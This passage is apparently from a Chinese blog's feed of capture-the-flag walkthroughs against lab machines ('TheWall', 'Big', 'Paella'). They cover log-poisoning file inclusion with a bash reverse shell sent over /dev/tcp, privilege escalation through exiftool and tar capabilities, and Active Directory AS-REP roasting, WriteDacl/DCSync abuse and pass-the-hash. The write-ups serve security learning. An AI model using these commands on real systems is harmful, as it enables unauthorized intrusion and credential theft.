<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>试了好几个字典没扫出来，无语了<br><img src="https://ooo.0x0.ooo/2024/08/07/Otz3yb.png" alt="Otz3yb.png" loading="lazy"><br>容易被ban，直接看到wp一个目录<code>includes.php</code><br><img src="https://ooo.0x0.ooo/2024/08/07/OtzCdl.png" alt="OtzCdl.png" loading="lazy"><br>这个参数无敌了，没耐心的话应该就错过了。</p>
<h2 id="文件包含rce"><a href="#文件包含rce" class="headerlink" title="文件包含rce"></a>文件包含rce</h2><p><img src="https://ooo.0x0.ooo/2024/08/07/OtFOeB.png" alt="OtFOeB.png" loading="lazy"><br>尝试filter不行，那就文件包含<br><img src="https://ooo.0x0.ooo/2024/08/07/OtFaEs.png" alt="OtFaEs.png" loading="lazy"><br>我也遇到了这样的问题，日志读都读不了<br><img src="https://ooo.0x0.ooo/2024/08/07/OtF5ha.png" alt="OtF5ha.png" loading="lazy"><br>重新导入一下好了，那就开始rce<br><img src="https://ooo.0x0.ooo/2024/08/07/OtFzaX.png" alt="OtFzaX.png" loading="lazy"><br>想直接在url处加好像不太行，会被url编码，在UA头加一下<br><img src="https://ooo.0x0.ooo/2024/08/07/OtFhGx.png" alt="OtFhGx.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/08/07/OtFiIj.png" alt="OtFiIj.png" loading="lazy"><br>成功rce了，弹个shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">http://192.168.1.111/includes.php?display_page<span class="token operator">=</span>/var/log/apache2/access.log<span class="token operator">&amp;</span><span class="token assign-left variable">1</span><span class="token operator">=</span>bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.103%2F4567%20%200%3E%261%27</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">4567</span>                                                                                                                                                                                                    <span class="token punctuation">[</span><span class="token number">11</span>:12:19<span class="token punctuation">]</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.1.103<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.1.111<span class="token punctuation">]</span> <span class="token number">42112</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">484</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
www-data@TheWall:/var/www/html$ <span class="token function">id</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span>
www-data@TheWall:/var/www/html$ </code></pre>
<p><img src="https://ooo.0x0.ooo/2024/08/07/OtF1hp.png" alt="OtF1hp.png" loading="lazy"><br>原来是有waf，怪不得这么容易被ban</p>
<h2 id="提权user"><a href="#提权user" class="headerlink" title="提权user"></a>提权user</h2><pre class="language-bash" data-language="bash"><code class="language-bash">www-data@TheWall:/var/www/html$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> www-data on TheWall:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin

User www-data may run the following commands on TheWall:
    <span class="token punctuation">(</span>john <span class="token builtin class-name">:</span> john<span class="token punctuation">)</span> NOPASSWD: /usr/bin/exiftool</code></pre>
<p>有个exiftool，这个是可以写入文件的<br>传个ssh公钥进去</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@TheWall:/tmp$ <span class="token function">ls</span>
<span class="token function">ls</span>
authorized_keys</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@TheWall:/tmp$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> john exiftool <span class="token parameter variable">-filename</span><span class="token operator">=</span>/home/john/.ssh/authorized_keys authorized_keys</code></pre>
<p>然后用私钥连接</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@TheWall:/tmp$  <span class="token function">scp</span> root@192.168.1.103:/root/.ssh/id_rsa id_rsa
The authenticity of <span class="token function">host</span> <span class="token string">'192.168.1.103 (192.168.1.103)'</span> can<span class="token string">'t be established.
ECDSA key fingerprint is SHA256:/mCbOD1y/6nWmFQqm4xBITIhb/bzBH9WId+w+enMRRs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="token number">192.168</span>.1.103<span class="token string">' (ECDSA) to the list of known hosts.
root@192.168.1.103'</span>s password:
id_rsa                                        <span class="token number">100</span>% <span class="token number">3414</span>     <span class="token number">7</span>.7MB/s   00:00
www-data@TheWall:/tmp$ <span class="token function">ls</span>
authorized_keys  id_rsa
www-data@TheWall:/tmp$ <span class="token function">chmod</span> <span class="token number">600</span> id_rsa
www-data@TheWall:/tmp$ <span class="token function">ssh</span> <span class="token parameter variable">-i</span> id_rsa john@localhost
The authenticity of <span class="token function">host</span> <span class="token string">'localhost (::1)'</span> can<span class="token string">'t be established.
ECDSA key fingerprint is SHA256:B5rYCjLqqIAUNVd/dSEQtCZrIoOVYpYzqn/4r2fvE/U.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>localhost<span class="token string">' (ECDSA) to the list of known hosts.
Enter passphrase for key '</span>id_rsa':
Linux TheWall <span class="token number">5.10</span>.0-18-amd64 <span class="token comment">#1 SMP Debian 5.10.140-1 (2022-09-02) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Oct <span class="token number">19</span> <span class="token number">17</span>:07:17 <span class="token number">2022</span> from <span class="token number">10.0</span>.2.15</code></pre>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><p>没有sudo，传个pspy64分析进程</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">john@TheWall:~$  <span class="token function">scp</span> root@192.168.1.103:/root/Desktop/pspy64
usage: <span class="token function">scp</span> <span class="token punctuation">[</span>-346ABCpqrTv<span class="token punctuation">]</span> <span class="token punctuation">[</span>-c cipher<span class="token punctuation">]</span> <span class="token punctuation">[</span>-F ssh_config<span class="token punctuation">]</span> <span class="token punctuation">[</span>-i identity_file<span class="token punctuation">]</span>
            <span class="token punctuation">[</span>-J destination<span class="token punctuation">]</span> <span class="token punctuation">[</span>-l limit<span class="token punctuation">]</span> <span class="token punctuation">[</span>-o ssh_option<span class="token punctuation">]</span> <span class="token punctuation">[</span>-P port<span class="token punctuation">]</span>
            <span class="token punctuation">[</span>-S program<span class="token punctuation">]</span> <span class="token builtin class-name">source</span> <span class="token punctuation">..</span>. target
john@TheWall:~$  <span class="token function">scp</span> root@192.168.1.103:/root/Desktop/pspy64 <span class="token builtin class-name">.</span>
The authenticity of <span class="token function">host</span> <span class="token string">'192.168.1.103 (192.168.1.103)'</span> can<span class="token string">'t be established.
ECDSA key fingerprint is SHA256:/mCbOD1y/6nWmFQqm4xBITIhb/bzBH9WId+w+enMRRs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="token number">192.168</span>.1.103<span class="token string">' (ECDSA) to the list of known hosts.
root@192.168.1.103'</span>s password:
pspy64                                        <span class="token number">100</span>% 3006KB <span class="token number">131</span>.5MB/s   00:00
john@TheWall:~$ <span class="token function">scp</span> root@192.168.1.103:/root/Desktop/linpeas.sh <span class="token builtin class-name">.</span>
root@192.168.1.103's password:
linpeas.sh                                    <span class="token number">100</span>%  809KB  <span class="token number">79</span>.5MB/s   00:00</code></pre>
<p>pspy64没看到什么收获，用linpeas分析<br><img src="https://ooo.0x0.ooo/2024/08/07/OtFNjY.png" alt="OtFNjY.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">/usr/sbin/tar <span class="token assign-left variable">cap_dac_read_search</span><span class="token operator">=</span>ep</code></pre>
<p>tar有个任意文件读取的权限<br>先创建tar然后再解压读取</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">john@TheWall:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /id_rsa
-rw------- <span class="token number">1</span> root root <span class="token number">2602</span> Oct <span class="token number">19</span>  <span class="token number">2022</span> /id_rsa</code></pre>
<p>发现root的私钥在根目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">john@TheWall:~$ /usr/sbin/tar <span class="token parameter variable">-czf</span> bb.tar.gz /id_rsa
/usr/sbin/tar: Removing leading `/' from member names</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">john@TheWall:~$ /usr/sbin/tar <span class="token parameter variable">-xvf</span> bb.tar.gz
id_rsa
john@TheWall:~$ <span class="token function">chmod</span> <span class="token number">600</span> id_rsa
john@TheWall:~$ <span class="token function">ssh</span> <span class="token parameter variable">-i</span> id_rsa root@127.0.0.1
The authenticity of <span class="token function">host</span> <span class="token string">'127.0.0.1 (127.0.0.1)'</span> can<span class="token string">'t be established.
ECDSA key fingerprint is SHA256:B5rYCjLqqIAUNVd/dSEQtCZrIoOVYpYzqn/4r2fvE/U.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="token number">127.0</span>.0.1' <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span> to the list of known hosts.
Linux TheWall <span class="token number">5.10</span>.0-18-amd64 <span class="token comment">#1 SMP Debian 5.10.140-1 (2022-09-02) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Oct <span class="token number">19</span> <span class="token number">19</span>:51:15 <span class="token number">2022</span> from <span class="token number">10.0</span>.2.15
root@TheWall:~<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
<p>拿到root。前面是真的有点恶心了。</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>include</tag>
        <tag>tar</tag>
      </tags>
  </entry>
  <entry>
    <title>thehackerslabs-Big</title>
    <url>/posts/8df01d3/</url>
    <content><![CDATA[<p><strong>难度:PROFESIONAL</strong></p>
<p><strong>kali:192.168.212.3</strong></p>
<p><strong>靶机:192.168.212.4</strong><br><img src="https://ooo.0x0.ooo/2024/08/05/Ot5vaD.png" alt="Ot5vaD.png" loading="lazy"></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  nmap <span class="token number">192.168</span>.212.4 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49669,49670,49671,49673,49676,49686,49704                                                   <span class="token punctuation">[</span><span class="token number">20</span>:42:27<span class="token punctuation">]</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-08-05 <span class="token number">20</span>:43 CST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.212.4
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00025s latency<span class="token punctuation">)</span>.

PORT      STATE SERVICE       VERSION
<span class="token number">53</span>/tcp    <span class="token function">open</span>  domain        Simple DNS Plus
<span class="token number">80</span>/tcp    <span class="token function">open</span>  http          Microsoft IIS httpd <span class="token number">10.0</span>
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">)</span>.
<span class="token operator">|</span> http-methods: 
<span class="token operator">|</span>_  Potentially risky methods: TRACE
<span class="token operator">|</span>_http-server-header: Microsoft-IIS/10.0
<span class="token number">88</span>/tcp    <span class="token function">open</span>  kerberos-sec  Microsoft Windows Kerberos <span class="token punctuation">(</span>server time: <span class="token number">2024</span>-08-06 03:43:18Z<span class="token punctuation">)</span>
<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn   Microsoft Windows netbios-ssn
<span class="token number">389</span>/tcp   <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: bbr.thl, Site: Default-First-Site-Name<span class="token punctuation">)</span>
<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds?
<span class="token number">464</span>/tcp   <span class="token function">open</span>  kpasswd5?
<span class="token number">593</span>/tcp   <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
<span class="token number">636</span>/tcp   <span class="token function">open</span>  tcpwrapped
<span class="token number">3268</span>/tcp  <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: bbr.thl, Site: Default-First-Site-Name<span class="token punctuation">)</span>
<span class="token number">3269</span>/tcp  <span class="token function">open</span>  tcpwrapped
<span class="token number">5985</span>/tcp  <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Not Found
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token number">9389</span>/tcp  <span class="token function">open</span>  mc-nmf        .NET Message Framing
<span class="token number">47001</span>/tcp <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Not Found
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token number">49664</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49665</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49666</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49669</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49670</span>/tcp <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
<span class="token number">49671</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49673</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49676</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49686</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49704</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC</code></pre>
<p>ad域名是bbr.thl.端口还是挺丰富的，先看一下web服务</p>
<h2 id="web服务"><a href="#web服务" class="headerlink" title="web服务"></a>web服务</h2><p><img src="https://ooo.0x0.ooo/2024/08/05/Ot5yeF.png" alt="Ot5yeF.png" loading="lazy"><br>没什么东西，扫一下目录<br><img src="https://ooo.0x0.ooo/2024/08/05/Ot5gE6.png" alt="Ot5gE6.png" loading="lazy"><br>翻了一下，注意到两个文件<br><img src="https://ooo.0x0.ooo/2024/08/05/Ot5mIP.png" alt="Ot5mIP.png" loading="lazy"></p>
<pre class="language-none"><code class="language-none">Who the hell did you hire to create the website!
Hiding keys in MD5 again!
I&#39;m going to fire that guy

Puffy</code></pre>
<p>提示:keys藏在了md5里面，而且还有一个用户名<code>Puffy</code><br><img src="https://ooo.0x0.ooo/2024/08/05/Ot5Jhb.png" alt="Ot5Jhb.png" loading="lazy"><br>好像秘密字典，保存下来, 然后就卡住了，尝试了smb匿名登录，爆破了一下用户名和密码都没用，然而回头看在图片里找到了一些线索。<br><img src="https://ooo.0x0.ooo/2024/08/05/Ot5Jhb.png" alt="Ot5Jhb.png" loading="lazy"><br>太抽象了吧，用一个主页图片里面的一句话md5加密当密码再隐写提取一个图片<code>Bigpoppa1972</code>，怀疑出题人心理健康<br>然后枚举一下用户名<br><img src="https://ooo.0x0.ooo/2024/08/05/Ot5Rjg.png" alt="Ot5Rjg.png" loading="lazy"><br>然后密码喷洒<br><img src="https://ooo.0x0.ooo/2024/08/05/Ot54WB.png" alt="Ot54WB.png" loading="lazy"><br>终于拿到一组账号密码<code>juicy:Bigpoppa1972</code></p>
<h2 id="winrm登录"><a href="#winrm登录" class="headerlink" title="winrm登录"></a>winrm登录</h2><p><img src="https://ooo.0x0.ooo/2024/08/05/Ot5Dys.png" alt="Ot5Dys.png" loading="lazy"><br>看一下本地管理员组</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Juicy<span class="token punctuation">\</span>Documents<span class="token operator">></span> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The <span class="token builtin class-name">command</span> completed successfully.</code></pre>
<p>查看当前目录找到user flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Juicy<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">dir</span>


    Directory: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Juicy<span class="token punctuation">\</span>Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        <span class="token number">4</span>/30/2024  <span class="token number">12</span>:53 AM             <span class="token number">32</span> user.txt


*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Juicy<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token builtin class-name">type</span> user.txt
53bdf70c03ad626fe7a17ba5a9495b3a</code></pre>
<p>尝试kerberoasting攻击<br><img src="https://ooo.0x0.ooo/2024/08/05/Ot5YWt.png" alt="Ot5YWt.png" loading="lazy"><br>未果</p>
<h2 id="AS-REP-Roasting攻击"><a href="#AS-REP-Roasting攻击" class="headerlink" title="AS-REP Roasting攻击"></a>AS-REP Roasting攻击</h2><p>尝试AS-REP Roasting攻击<br><img src="https://ooo.0x0.ooo/2024/08/05/Ot5fgx.png" alt="Ot5fgx.png" loading="lazy"><br>nice，终于有东西了。adm_puffy没有开启预认证，我直接拿下它的哈希<br><img src="https://ooo.0x0.ooo/2024/08/05/Ot5lsj.png" alt="Ot5lsj.png" loading="lazy"><br>john跑一下密码，用网站给的字典<br><img src="https://ooo.0x0.ooo/2024/08/05/OtBiqK.png" alt="OtBiqK.png" loading="lazy"><br>拿到一组账号密码<code>adm_puffy:Passwordsave@</code><br>winrm登录，看用户所属组<br><img src="https://ooo.0x0.ooo/2024/08/05/OtBXKK.png" alt="OtBXKK.png" loading="lazy"><br>有个<code>Privilege users</code>组权限，看一下这个组的信息</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">Get-ADGroup <span class="token parameter variable">-Identity</span> <span class="token string">"Privilege users"</span> <span class="token parameter variable">-Properties</span> *</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/08/05/OtBXKK.png" alt="OtBXKK.png" loading="lazy"><img src="https://ooo.0x0.ooo/2024/08/05/OtBu0a.png" alt="OtBu0a.png" loading="lazy"></p>
<h2 id="bloodhound-WriteDacl"><a href="#bloodhound-WriteDacl" class="headerlink" title="bloodhound+WriteDacl"></a>bloodhound+WriteDacl</h2><p>用一个分析组成员关系的分析工具<code>bloodhound</code><br>现有python收集域内信息</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/big<span class="token punctuation">]</span> ➜  bloodhound-python <span class="token parameter variable">-u</span> <span class="token string">'adm_puffy'</span> <span class="token parameter variable">-p</span> <span class="token string">'Passwordsave@'</span> <span class="token parameter variable">-d</span> bbr.thl  <span class="token parameter variable">-v</span>  <span class="token parameter variable">-ns</span> <span class="token number">192.168</span>.212.4 <span class="token parameter variable">-c</span> ALL </code></pre>
<p><img src="https://ooo.0x0.ooo/2024/08/06/OtTiJr.png" alt="OtTiJr.png" loading="lazy"><br>把生成的json拖到bloodhound<br><img src="https://ooo.0x0.ooo/2024/08/06/OtTnlM.png" alt="OtTnlM.png" loading="lazy"><br>这下关系就很清晰了，可以看到这个组属于<code>Account Operators</code>这个组，该组默认是域内管理用户和组的特殊权限组。可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录。<code>Account Operators</code> 组对<code>Special Permissions</code> 组拥有 Generic All权限，<br><img src="https://ooo.0x0.ooo/2024/08/06/OtT7BG.png" alt="OtT7BG.png" loading="lazy"><br><code>Special Permissions</code>有WriteDacl权限，WriteDACL权限可以修改域对象的ACL，最终实现利用DCSync导出域内所有用户hash。<br>所以提权的思路就是利用adm_puffy继承的WriteDacl权限修改域内任意用户的acl权限，实现DCSync提权。<br><img src="https://ooo.0x0.ooo/2024/08/06/OtTNZ1.png" alt="OtTNZ1.png" loading="lazy"><br>首先将adm_puffy用户添加到<code>Special Permissions</code>组</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>adm_puffy<span class="token punctuation">\</span>Documents<span class="token operator">></span> net group <span class="token string">"Special Permissions"</span> adm_puffy /add
The <span class="token builtin class-name">command</span> completed successfully.</code></pre>

<p>尝试授予adm_puffy DCsync的权限，先向域控验证自己的<code>Special Permissions</code>身份</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>adm_puffy<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token variable">$password</span> <span class="token operator">=</span> ConvertTo-SecureString <span class="token string">'Passwordsave@'</span> <span class="token parameter variable">-AsPlainText</span> <span class="token parameter variable">-Force</span>
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>adm_puffy<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token variable">$credential</span> <span class="token operator">=</span> New-Object System.Management.Automation.PSCredential <span class="token punctuation">(</span><span class="token string">'bbr.thl\adm_puffy'</span>, <span class="token variable">$password</span><span class="token punctuation">)</span></code></pre>
<p>然后用<code>Special permissions</code>的身份给Special Permissions这个组DCSync权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>adm_puffy<span class="token punctuation">\</span>Documents<span class="token operator">></span> Add-DomainObjectAcl <span class="token parameter variable">-Credential</span> <span class="token variable">$credential</span> <span class="token parameter variable">-PrincipalIdentity</span> <span class="token string">'Special permissions'</span>-TargetIdentity <span class="token string">"bbr.thl\Special permissions"</span> <span class="token parameter variable">-Rights</span> DCSync</code></pre>
<h2 id="DCSync-PTH"><a href="#DCSync-PTH" class="headerlink" title="DCSync+PTH"></a>DCSync+PTH</h2><p>用secretsdump.py获取哈希<br><img src="https://ooo.0x0.ooo/2024/08/05/OtBXKK.png" alt="OtBXKK.png" loading="lazy"><img src="https://ooo.0x0.ooo/2024/08/05/OtBu0a.png" alt="OtBu0a.png" loading="lazy"><img src="https://ooo.0x0.ooo/2024/08/06/OtTbMU.png" alt="OtTbMU.png" loading="lazy"><br>然后哈希传递登录域控<br><img src="https://ooo.0x0.ooo/2024/08/06/OtTk1Y.png" alt="OtTk1Y.png" loading="lazy"></p>
]]></content>
      <categories>
        <category>thehackerlabs</category>
      </categories>
      <tags>
        <tag>AD</tag>
        <tag>AS-REP Roasting</tag>
        <tag>WriteDacl</tag>
        <tag>DCSync</tag>
      </tags>
  </entry>
  <entry>
    <title>thehackerslabs-Paella</title>
    <url>/posts/19aecb8c/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.107</strong></p>
<p><strong>靶机:192.168.1.103</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.1.107
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.1.1     <span class="token number">78</span>:60:5b:04:b4:8c       TP-LINK TECHNOLOGIES CO.,LTD.
<span class="token number">192.168</span>.1.102   <span class="token number">44</span>:e5:17:0a:27:01       Intel Corporate
<span class="token number">192.168</span>.1.103   08:00:27:16:4c:b3       PCS Systemtechnik GmbH</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token number">192.168</span>.1.103
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-30 <span class="token number">10</span>:20 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.103
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.000077s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT      STATE SERVICE
<span class="token number">22</span>/tcp    <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">10000</span>/tcp <span class="token function">open</span>  snet-sensor-mgmt
MAC Address: 08:00:27:16:4C:B3 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.14</span> seconds</code></pre>
<p><code>snet-sensor-mgmt</code>没见过这个服务，搜了一下，就是个web服务器<br><img src="https://ooo.0x0.ooo/2024/07/30/ORjGNK.png" alt="ORjGNK.png" loading="lazy"><br>搜一下漏洞</p>
<h2 id="漏洞搜索"><a href="#漏洞搜索" class="headerlink" title="漏洞搜索"></a>漏洞搜索</h2><pre class="language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>linux/http/webmin_backdoor<span class="token punctuation">)</span> <span class="token operator">></span> options

Module options <span class="token punctuation">(</span>exploit/linux/http/webmin_backdoor<span class="token punctuation">)</span>:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of <span class="token function">format</span> type:host:port<span class="token punctuation">[</span>,type:host:port<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
   RHOSTS                      <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      <span class="token number">10000</span>            <span class="token function">yes</span>       The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
   SSL        <span class="token boolean">false</span>            no        Negotiate SSL/TLS <span class="token keyword">for</span> outgoing connections
   SSLCert                     no        Path to a custom SSL certificate <span class="token punctuation">(</span>default is randomly generated<span class="token punctuation">)</span>
   TARGETURI  /                <span class="token function">yes</span>       Base path to Webmin
   URIPATH                     no        The URI to use <span class="token keyword">for</span> this exploit <span class="token punctuation">(</span>default is random<span class="token punctuation">)</span>
   VHOST                       no        HTTP server virtual <span class="token function">host</span>


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  <span class="token number">0.0</span>.0.0          <span class="token function">yes</span>       The <span class="token builtin class-name">local</span> <span class="token function">host</span> or network interface to listen on. This must be an address on the <span class="token builtin class-name">local</span> machine or <span class="token number">0.0</span>.0.0 to listen on all addresses.
   SRVPORT  <span class="token number">8080</span>             <span class="token function">yes</span>       The <span class="token builtin class-name">local</span> port to listen on.


